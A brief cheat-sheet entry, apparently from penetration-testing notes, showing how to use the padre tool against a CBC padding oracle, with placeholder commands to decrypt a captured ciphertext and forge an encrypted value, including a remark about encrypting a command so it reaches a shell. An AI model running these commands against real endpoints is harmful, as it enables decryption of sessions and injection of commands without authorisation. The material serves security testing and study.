# CBC Padding Oracle (padre)

If an endpoint returns a distinguishable error for bad CBC padding, you can decrypt an intercepted ciphertext and encrypt arbitrary chosen plaintext — no key needed.

```bash
# decrypt a captured ciphertext parameter
padre -cookie '<session-cookie>' -u '<url-with-$-in-place-of-the-param>' '<base64-ciphertext>'

# encrypt a chosen plaintext (e.g. a command, if the decrypted value feeds a shell)
padre -cookie '<session-cookie>' -u '<url-with-$-in-place-of-the-param>' -enc '<plaintext-to-encrypt>'
# submit the tool's output as the parameter value
```
